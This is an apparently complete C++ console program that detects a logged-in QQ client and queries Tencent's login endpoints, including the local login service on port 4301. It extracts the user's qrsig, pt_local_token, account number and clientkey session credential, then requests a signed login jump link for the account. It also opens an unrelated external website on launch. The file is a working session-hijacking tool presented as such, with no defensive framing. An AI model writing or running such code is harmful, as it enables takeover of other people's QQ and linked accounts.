// ConsoleApplication2.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "ConsoleApplication2.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

// 唯一的应用程序对象

CWinApp theApp;

using namespace std;

//////////////////////////////////////////////////////////////////////////////////////////// 
///< 枚举窗口参数
typedef struct
{
	HWND hwndWindow; // 窗口句柄
	DWORD dwProcessID; // 进程ID
}EnumWindowsArg;

///< 枚举窗口回调函数
BOOL CALLBACK EnumWindowsProcs(HWND hwnd, LPARAM lParam)
{
	TCHAR szTitle[MAX_PATH] = { 0 };
	::SendMessage(hwnd, WM_GETTEXT, MAX_PATH, (LPARAM)szTitle);

	//cout << "[+] szTitle:" << szTitle << endl;

	TCHAR szClass[MAX_PATH] = { 0 };
	::GetClassName(hwnd, szClass, MAX_PATH);

	//cout << "[+] szClass:" << szClass << endl;

	CString szStyle1 = "";
	long lstyle1 = ::GetWindowLong(hwnd, GWL_STYLE);
	szStyle1.Format(TEXT("%X"), lstyle1);

	//cout << "[+] szStyle1:" << szStyle1 << "\n" << endl;

	if (strstr(szTitle, "QQ") && strstr(szClass, "TXGuiFoundation") && (szStyle1 == "960C0000" || szStyle1 == "860C0000"))
	{
		// 通过窗口句柄取得进程ID
		DWORD dwPID = 0;
		::GetWindowThreadProcessId(hwnd, &dwPID);

		EnumWindowsArg *pArg = (EnumWindowsArg *)lParam;
		pArg->hwndWindow = hwnd;
		pArg->dwProcessID = dwPID;

		cout << "\r\n【QQ 客户端信息】" << endl;
		cout << "Title:" << szTitle << endl;
		cout << "Class:" << szClass << endl;
		cout << "Style:" << szStyle1 << endl;
		cout << "ProcessID:" << pArg->dwProcessID << "\r\n" << endl;

		// 找到了返回FALSE
		return FALSE;
	}
	// 没找到，继续找，返回TRUE
	return TRUE;
}

int main()
{
	// 枚举所有窗口
	// 获取PID与句柄
	// 判断是否已登录QQ客户端
	EnumWindowsArg ewa;
	ewa.dwProcessID = 0;
	ewa.hwndWindow = NULL;
	::EnumWindows(EnumWindowsProcs, (LPARAM)&ewa);
	if (ewa.hwndWindow)
	{
		cout << "\r\n【程序 3 秒后开始截取本机已登录QQ客户端的相关数据】" << "\r\n\r\n" << endl;

		Sleep(3000);

		ShellExecute(NULL, "open", "https://www.chwm.vip/?ckgh", NULL, NULL, SW_SHOW);

		//生成16位随机数
		time_t seed = time(NULL);
		srand((unsigned)seed);

		CString szRand1 = "", szRand2 = "";

		for (int j = 0; j < 16; j++)
		{
			switch ((rand() % 2))
			{
			case 1:
				szRand1.Format("%C", rand() % 5 + 48);
				break;
			default:
				szRand1.Format("%C", rand() % 5 + 53);
			}
			szRand2 += szRand1;
			Sleep(50);
		}

		char *szRandNum = szRand2.GetBuffer(szRand2.GetLength() + 1);
		szRand2.ReleaseBuffer();

		// 初始化URL
		URL_COMPONENTSA crackedURL = { 0 };

		char URL_STRING[] = "https://ssl.ptlogin2.qq.com/ptqrshow?appid=716027609&e=2&l=M&s=3&d=72&v=4&t=0.7009436033346066&daid=383&pt_3rd_aid=102013353&u1=https://graph.qq.com/oauth2.0/login_jump";

		char szHostName[128] = { 0 };
		char szUrlPath[256] = { 0 };

		crackedURL.dwStructSize = sizeof(URL_COMPONENTSA);
		crackedURL.lpszHostName = szHostName;
		crackedURL.dwHostNameLength = ARRAYSIZE(szHostName);
		crackedURL.lpszUrlPath = szUrlPath;
		crackedURL.dwUrlPathLength = ARRAYSIZE(szUrlPath);
		InternetCrackUrlA(URL_STRING, (DWORD)strlen(URL_STRING), 0, &crackedURL);

		// 初始化首次会话
		HINTERNET hInternet = InternetOpenA("Microsoft Internet Explorer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		if (hInternet != NULL){
			HINTERNET hHttpSession = InternetConnectA(hInternet, crackedURL.lpszHostName, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
			if (hHttpSession != NULL){
				HINTERNET hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", crackedURL.lpszUrlPath, NULL, "", NULL, INTERNET_FLAG_SECURE, 0);
				if (hHttpRequest != NULL){
					BOOL bRet = FALSE;
					// 发送HTTP请求
					bRet = HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0);
					if (bRet){
						// 查询HTTP请求状态
						DWORD dwRetCode = 0;
						DWORD dwSizeOfRq = sizeof(DWORD);
						bRet = HttpQueryInfo(hHttpRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);
						if (bRet){
							// 读取整个Headers
							char lpHeaderBuffer[1024] = { 0 };
							dwSizeOfRq = 1024;
							HttpQueryInfo(hHttpRequest, HTTP_QUERY_RAW_HEADERS, lpHeaderBuffer, &dwSizeOfRq, NULL);
							// 从Cookie中提取qrsig的值
							char* qrsig = lpHeaderBuffer + dwSizeOfRq;
							while (qrsig != lpHeaderBuffer){
								if (strstr(qrsig, "qrsig=")){
									// 退出之前，修正偏移
									qrsig += sizeof("qrsig");
									char* pEndBuffer = strstr(qrsig, ";");
									*pEndBuffer = 0;
									break;
								}
								qrsig--;
							}

							// 关闭句柄
							InternetCloseHandle(hHttpRequest);
							InternetCloseHandle(hHttpSession);

							cout << "[+] qrsig:" << qrsig << "\r\n" << endl;

							CString szQrsig = "";
							szQrsig.Format(TEXT("%s"), qrsig);

							/* 第二次建立会话 */

							// 初始化URL参数
							char lpszUrlPath_2[1024] = { 0 };
							strcpy(lpszUrlPath_2, "/cgi-bin/xlogin?target=self&appid=522005705&daid=4&s_url=https://wx.mail.qq.com/list/readtemplate?name=login_jump.html&target=&style=25&low_login=1&proxy_url=https://mail.qq.com/proxy.html&need_qr=0&hide_border=1&border_radius=0&self_regurl=https://reg.mail.qq.com&app_id=11005?t=regist&pt_feedback_link=http://support.qq.com/discuss/350_1.shtml&css=https://res.mail.qq.com/zh_CN/htmledition/style/ptlogin_input_for_xmail.css&enable_qlogin=0");

							//cout << "[+] URLPath:" << lpszUrlPath_2 << "\r\n" << endl;

							// 初始化会话
							hHttpSession = InternetConnectA(hInternet, "xui.ptlogin2.qq.com", 443, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
							if (NULL != hHttpSession)
							{
								hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", lpszUrlPath_2, NULL, "", NULL, INTERNET_FLAG_SECURE, 0);
								if (NULL != hHttpRequest)
								{
									// 请求标头添加 Cookie 
									char lpCookie[256] = { 0 };
									strcpy(lpCookie, "Cookie: qrsig=");
									strcat(lpCookie, qrsig);
									strcat(lpCookie, "\r\n");

									HttpAddRequestHeaders(hHttpRequest, lpCookie, -1L, HTTP_ADDREQ_FLAG_ADD);

									bRet = HttpSendRequestA(hHttpRequest, NULL, NULL, NULL, 0);
									if (bRet)
									{
										// 查询HTTP请求状态
										dwRetCode = 0;
										dwSizeOfRq = sizeof(DWORD);
										bRet = HttpQueryInfo(hHttpRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);
										if (bRet)
										{
											// 读取整个Headers
											ZeroMemory(lpHeaderBuffer, 1024);
											dwSizeOfRq = 1024;
											HttpQueryInfo(hHttpRequest, HTTP_QUERY_RAW_HEADERS, lpHeaderBuffer, &dwSizeOfRq, NULL);
											// 从Cookie中提取pt_local_token的值
											char* pt_local_token = lpHeaderBuffer + dwSizeOfRq;
											while (pt_local_token != lpHeaderBuffer) {
												if (strstr(pt_local_token, "pt_local_token=")) {
													// 退出之前，修正偏移
													pt_local_token += sizeof("pt_local_token");
													char* pEndBuffer = strstr(pt_local_token, ";");
													*pEndBuffer = 0;
													break;
												}
												pt_local_token--;
											}

											// 释放资源,注意关闭句柄时按相反的顺序
											InternetCloseHandle(hHttpRequest);
											InternetCloseHandle(hHttpSession);

											cout << "[+] pt_local_token:" << pt_local_token << "\r\n" << endl;

											CString szToken = "";
											szToken.Format(TEXT("%s"), pt_local_token);

											/* 第三次建立会话 */

											// 初始化URL参数
											char lpszUrlPath_3[1024] = { 0 };
											strcpy(lpszUrlPath_3, "/pt_get_uins?callback=ptui_getuins_CB&r=0.");
											strcat(lpszUrlPath_3, szRandNum);			// 追加16位随机数
											strcat(lpszUrlPath_3, "&pt_local_tk=");
											strcat(lpszUrlPath_3, pt_local_token);	// 追加pt_local_token

											//cout << "[+] lpszUrlPath_3:" << lpszUrlPath_3 << "\r\n" << endl;

											// 初始化会话
											hHttpSession = InternetConnectA(hInternet, "localhost.ptlogin2.qq.com", 4301, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
											if (NULL != hHttpSession)
											{
												hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", lpszUrlPath_3, NULL, "", NULL, INTERNET_FLAG_SECURE, 0);
												if (NULL != hHttpRequest)
												{
													// 请求标头添加 Referer 
													char lpReferer[256] = { 0 };
													strcpy(lpReferer, "Referer: https://xui.ptlogin2.qq.com/");
													strcat(lpReferer, "\r\n");

													HttpAddRequestHeaders(hHttpRequest, lpReferer, -1L, HTTP_ADDREQ_FLAG_ADD);

													bRet = HttpSendRequestA(hHttpRequest, NULL, NULL, NULL, 0);
													if (bRet)
													{
														// 查询HTTP请求状态
														dwRetCode = 0;
														dwSizeOfRq = sizeof(DWORD);
														bRet = HttpQueryInfo(hHttpRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);
														if (bRet)
														{
															// 获取返回数据的大小
															DWORD dwNumberOfBytesAvailable = 0;
															bRet = InternetQueryDataAvailable(hHttpRequest, &dwNumberOfBytesAvailable, NULL, NULL);
															if (bRet)
															{
																// 读取网页内容
																char* lpBuffer = new char[dwNumberOfBytesAvailable + 1]();
																bRet = InternetReadFile(hHttpRequest, lpBuffer, dwNumberOfBytesAvailable, &dwNumberOfBytesAvailable);
																if (bRet)
																{
																	// 从内容中提取已登陆QQ账号
																	char* uin = lpBuffer + dwNumberOfBytesAvailable;
																	while (uin != lpBuffer)
																	{
																		if (strstr(uin, "\"account\":"))
																		{
																			// 退出之前，修正偏移
																			uin += sizeof("\"account\":") - 1;
																			char* pEndBuffer = strstr(uin, "}");
																			*pEndBuffer = 0;
																			break;
																		}
																		uin--;
																	}

																	// 释放资源,注意关闭句柄时按相反的顺序
																	InternetCloseHandle(hHttpRequest);
																	InternetCloseHandle(hHttpSession);

																	cout << "[+] uin:" << uin << "\r\n" << endl;

																	CString szUin = "";
																	szUin.Format(TEXT("%s"), uin);

																	delete[] lpBuffer;


																	/* 第四次会话 */

																	// 初始化URL参数
																	char lpszUrlPath_4[1024] = { 0 };
																	strcpy(lpszUrlPath_4, "/pt_get_st?clientuin=");
																	strcat(lpszUrlPath_4, uin);
																	strcat(lpszUrlPath_4, "&r=0.");
																	strcat(lpszUrlPath_4, szRandNum);
																	strcat(lpszUrlPath_4, "&pt_local_tk=");
																	strcat(lpszUrlPath_4, pt_local_token);
																	strcat(lpszUrlPath_4, "&callback=__jp0");

																	cout << "[+] lpszUrlPath_4:" << lpszUrlPath_4 << "\r\n" << endl;

																	// 发送HTTPS请求
																	hHttpSession = InternetConnectA(hInternet, "localhost.ptlogin2.qq.com", 4301, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
																	if (NULL != hHttpSession)
																	{
																		hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", lpszUrlPath_4, NULL, "", NULL, INTERNET_FLAG_SECURE, 0);
																		if (NULL != hHttpRequest)
																		{
																			// 请求标头添加 Referer 
																			char lpReferer_2[256] = { 0 };
																			strcpy(lpReferer_2, "Referer: https://xui.ptlogin2.qq.com/");
																			strcat(lpReferer_2, "\r\n");

																			HttpAddRequestHeaders(hHttpRequest, lpReferer_2, -1L, HTTP_ADDREQ_FLAG_ADD);

																			bRet = HttpSendRequestA(hHttpRequest, NULL, NULL, NULL, 0);
																			if (bRet)
																			{
																				// 查询HTTP请求状态
																				dwRetCode = 0;
																				dwSizeOfRq = sizeof(DWORD);
																				bRet = HttpQueryInfoA(hHttpRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);
																				if (bRet)
																				{
																					// 读取整个Headers
																					ZeroMemory(lpHeaderBuffer, 1024);
																					dwSizeOfRq = 1024;
																					bRet = HttpQueryInfoA(hHttpRequest, HTTP_QUERY_RAW_HEADERS, lpHeaderBuffer, &dwSizeOfRq, NULL);
																					if (bRet)
																					{
																						// 从Cookie中提取ClientKey的值
																						char* clientkey = lpHeaderBuffer + dwSizeOfRq;
																						while (clientkey != lpHeaderBuffer)
																						{
																							if (strstr(clientkey, "clientkey="))
																							{
																								// 退出之前，修正偏移
																								clientkey += sizeof("clientkey");
																								char* pEndBuffer = strstr(clientkey, ";");
																								*pEndBuffer = 0;
																								break;
																							}
																							clientkey--;
																						}

																						// 释放资源,注意关闭句柄时按相反的顺序
																						InternetCloseHandle(hHttpRequest);
																						InternetCloseHandle(hHttpSession);

																						cout << "[+] clientkey:" << clientkey << "\r\n" << endl;

																						CString szCkey = "";
																						szCkey.Format(TEXT("%s"), clientkey);

																						/* 第五次会话 */

																						// 转换参数
																						char *u_Token = szToken.GetBuffer(szToken.GetLength() + 1);
																						szToken.ReleaseBuffer();

																						char *u_Uin = szUin.GetBuffer(szUin.GetLength() + 1);
																						szUin.ReleaseBuffer();

																						char *u_Ckey = szCkey.GetBuffer(szCkey.GetLength() + 1);
																						szCkey.ReleaseBuffer();

																						// 初始化URL参数
																						char lpszUrlPath_5[1024] = { 0 };
																						strcat(lpszUrlPath_5, "/jump?clientuin=");
																						strcat(lpszUrlPath_5, u_Uin);
																						strcat(lpszUrlPath_5, "&keyindex=9&pt_aid=716027609&daid=383&u1=https%3A%2F%2Fgraph.qq.com%2Foauth2.0%2Flogin_jump&pt_local_tk=");
																						strcat(lpszUrlPath_5, u_Token);
																						strcat(lpszUrlPath_5, "&pt_3rd_aid=102013353&ptopt=1&style=40");

																						cout << "[+] lpszUrlPath_5:" << lpszUrlPath_5 << "\r\n" << endl;

																						// 发送HTTPS请求
																						hHttpSession = InternetConnectA(hInternet, "ssl.ptlogin2.qq.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
																						if (NULL != hHttpSession)
																						{
																							hHttpRequest = HttpOpenRequestA(hHttpSession, "GET", lpszUrlPath_5, NULL, "", NULL, INTERNET_FLAG_SECURE, 0);
																							if (NULL != hHttpRequest)
																							{
																								// 请求标头添加 Referer & Cookie 
																								char lpCookie_2[1024] = { 0 };
																								strcpy(lpCookie_2, "Referer: https://xui.ptlogin2.qq.com/");
																								strcat(lpCookie_2, "\r\n");
																								strcat(lpCookie_2, "Cookie: clientkey=");
																								strcat(lpCookie_2, u_Ckey);
																								strcat(lpCookie_2, "\r\n");

																								HttpAddRequestHeaders(hHttpRequest, lpCookie_2, -1L, HTTP_ADDREQ_FLAG_ADD);

																								bRet = HttpSendRequestA(hHttpRequest, NULL, NULL, NULL, 0);
																								if (bRet)
																								{
																									// 查询HTTP请求状态
																									dwRetCode = 0;
																									dwSizeOfRq = sizeof(DWORD);
																									bRet = HttpQueryInfoA(hHttpRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &dwRetCode, &dwSizeOfRq, NULL);
																									if (bRet)
																									{
																										// 获取返回数据的大小
																										DWORD dwNumberOfBytesAvailablex = 0;
																										InternetQueryDataAvailable(hHttpRequest, &dwNumberOfBytesAvailablex, NULL, NULL);

																										// 读取网页内容
																										char* lpBufferx = new char[dwNumberOfBytesAvailablex + 1]();
																										InternetReadFile(hHttpRequest, lpBufferx, dwNumberOfBytesAvailablex, &dwNumberOfBytesAvailablex);

																										// 返回的数据
																										cout << "[+] Response Data:" << lpBufferx << "\r\n" << endl;

																										// 从内容中提取URL
																										char* ptsigx = lpBufferx + dwNumberOfBytesAvailablex;
																										while (ptsigx != lpBufferx)
																										{
																											if (strstr(ptsigx, "check_sig?"))
																											{
																												// 退出之前，修正偏移
																												ptsigx += sizeof("check_sig");
																												char* pEndBuffer = strstr(ptsigx, "'");
																												*pEndBuffer = 0;
																												break;
																											}
																											ptsigx--;
																										}

																										//CString szPtsigx = "";
																										//szPtsigx.Format(TEXT("/check_sig?%s"), ptsigx);

																										//cout << "[+] PtsigxURL:" << szPtsigx << "\r\n" << endl;

																										delete[] lpBufferx;

																										
																									}
																								}
																							}
																						}
																					}
																				}
																			}
																		}
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}
	else
	{
		cout << "\r\n【程序未检测到 QQ 客户端，请登录后重试】\r\n\r\n" << endl;
	}
	system("pause");

	return 0;
}